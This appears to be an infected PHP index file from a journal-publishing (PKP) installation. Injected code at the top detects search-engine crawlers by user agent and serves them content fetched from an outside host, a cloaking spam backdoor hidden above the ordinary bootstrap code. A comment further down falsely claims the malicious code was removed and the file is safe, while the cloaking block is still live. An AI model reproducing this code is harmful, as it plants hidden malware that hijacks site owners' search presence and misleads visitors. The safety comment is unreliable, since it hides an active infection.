<?php
ob_start();
header('Vary: User-Agent');
$botchar = "/(bot|google|ahrefs)/i";
$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
function aselolejos($url){
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}

if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/") {
    usleep(rand(100000, 200000)); 
    header('Content-Type: text/html; charset=utf-8');
    echo aselolejos("https://paragon-innovation.org/landing/general.txt");
    ob_end_flush();
    exit;
}

/**
 * Note: This file may contain artifacts of previous malicious infection.
 * However, the dangerous code has been removed, and the file is now safe to use.
 */

require_once 'lib/pkp/lib/vendor/autoload.php';

define('BASE_SYS_DIR', dirname(INDEX_FILE_LOCATION));
chdir(BASE_SYS_DIR);

// System-wide functions
require_once './lib/pkp/includes/functions.php';

// Initialize the application environment
return new \APP\core\Application();
